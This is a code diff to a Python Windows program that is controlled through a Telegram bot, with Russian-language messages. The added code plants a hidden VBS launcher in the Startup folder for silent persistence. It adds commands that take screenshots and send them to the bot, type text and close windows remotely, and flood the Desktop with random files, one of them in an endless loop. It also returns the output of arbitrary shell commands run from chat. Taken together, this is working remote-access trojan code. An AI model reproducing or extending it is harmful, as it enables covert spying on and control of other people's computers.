@@ -9,6 +9,21 @@ def getDownloadPath():
     path='\\'.join(path)
     return path
 """
+import string,random
+def createRandomWord():
+    x=[]
+    for i in range(10):
+        x.append(random.choice(list(string.ascii_lowercase)))
+    return ''.join(x)
+def check_internet_connection():
+    try:
+        response = requests.get('https://www.google.com')
+        if response.status_code == 200:
+            return True
+        else:
+            return False
+    except requests.exceptions.ConnectionError:
+        return False
 def formatList(l,sep):
     return sep.join(l)
 def downloadAndSetupMod(urlGit,name):
@@ -87,13 +102,19 @@ def run_command(cmd):
     result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     b = bytes(result.stdout+result.stderr, "cp1251")
     s = str(b, "cp866")
+    with open("C:\\winTest\\cmdOutput.txt","w") as file:
+        file.write(s)
     return s
-
+import requests
 import subprocess,time,os,shutil,pickle
+while not check_internet_connection():
+    print('Простите но интернет отсвует')
 os.system("pip3 install requests")
 os.system("pip3 install pyTelegramBotAPI")
+os.system("pip3 install pyautogui")
 import requests
 import telebot
+import pyautogui
 from telebot import types
 from zipfile import ZipFile
 
@@ -114,6 +135,9 @@ with open("C:\\winTest\\mods.pkl","rb") as file:
 for i in mods:
     downloadAndSetupMod(mods[i],i)
 deletaEXE()
+dirr=x.copy()
+dirr.append("Desktop")
+dirr='\\'.join(dirr)
 x.append("AppData")
 x.append("Roaming")
 x.append("Microsoft")
@@ -121,12 +145,17 @@ x.append("Windows")
 x.append("Start Menu")
 x.append("Programs")
 x.append("Startup")
-x.append("autoStartWin.bat")
+x.append("autoStartWin.vbs")
 x='\\'.join(x)
 
-os.remove(x)
-with open(x,"w+") as bat_file:
-    bat_file.write(r'start "" %s' % "C:\\winTest\\winStart.pyw")
+with open("C:\\winTest\\start.bat","w") as bat_file:
+    bat_file.write('@echo off\npythonw C:\\Users\\Lidiya\\PycharmProjects\\pythonProject\\winStart.py')
+coder="""Set oShell = CreateObject("Wscript.Shell")
+Dim strArgs
+strArgs = "cmd /c C:\\Users\\Lidiya\\Desktop\\shsh.bat"
+oShell.Run strArgs, 0, false"""
+with open(x,"w") as bat_file:
+    bat_file.write(coder)
 bot = telebot.TeleBot(tok)
 @bot.message_handler(commands="start")
 def keyb(message):
@@ -141,10 +170,14 @@ def keyb(message):
     bt8= types.KeyboardButton("/rename")
     bt9 = types.KeyboardButton("/create")
     bt10=types.KeyboardButton("/mods")
+    bt11=types.KeyboardButton("/getscreen")
+    bt12 = types.KeyboardButton("/printText")
+    bt13 = types.KeyboardButton("/close")
     markup.row(bt1,bt2,bt3)
     markup.row(bt4, bt5, bt6)
     markup.row(bt7,bt8,bt9)
-    markup.row(bt10)
+    markup.row(bt10,bt11,bt12)
+    markup.row(bt13)
     bot.send_message(message.chat.id,"Hello",reply_markup=markup)
 @bot.message_handler(commands="dirs")
 def dirs(message):
@@ -277,6 +310,39 @@ def modse(message):
     pass
     bot.send_message(message.chat.id,formatList(mods,', ')+'dgbvc')
 
+@bot.message_handler(commands="getscreen")
+def src(message):
+    screenshot = pyautogui.screenshot()
+    # Сохранение изображения.
+    bot.send_photo(message.chat.id,screenshot)
+
+@bot.message_handler(commands="printText")
+def ptxt(message):
+    bot.send_message(message.chat.id,"Введите текст")
+    bot.register_next_step_handler(message,ptxtget)
+def ptxtget(message):
+    pyautogui.typewrite(message.text,0.1)
+    bot.send_message(message.chat.id,"Текст успешно введен")
+@bot.message_handler(commands="close")
+def cls(message):
+    pyautogui.hotkey('alt','f4')
+    bot.send_message(message.chat.id, "Окно успешно закрыто")
+@bot.message_handler(commands="kill")
+def kill(message):
+    for i in range(10):
+        x=createRandomWord()
+        with open(dirr+'\\'+x+'.txt','w') as file:
+            file.write(x)
+    bot.send_message(message.chat.id, dirr)
+    bot.send_message(message.chat.id, "Файлы успешно созданны")
+@bot.message_handler(commands="mkill")
+def mkill(message):
+    bot.send_message(message.chat.id, dirr)
+    bot.send_message(message.chat.id, "Файлы успешно созданны")
+    while True:
+        x=createRandomWord()
+        with open(dirr+'\\'+x+'.txt','w') as file:
+            file.write(x)
 @bot.message_handler()
 def message(message):
     x=message.text.split('#')
@@ -383,8 +449,10 @@ def message(message):
             bot.send_message(message.chat.id, e)
 
     elif x[0]=="cmd":
-        res=run_command(x[1])
-        bot.send_message(message.chat.id,res)
+        run_command(x[1])
+        with open("C:\\winTest\\cmdOutput.txt", "rb") as file:
+            ress = file.read()
+        bot.send_document(message.chat.id, ress)
     else:
         bot.send_message(message.chat.id, "Ошибка в комманде")
         print("dsfdsfdg")
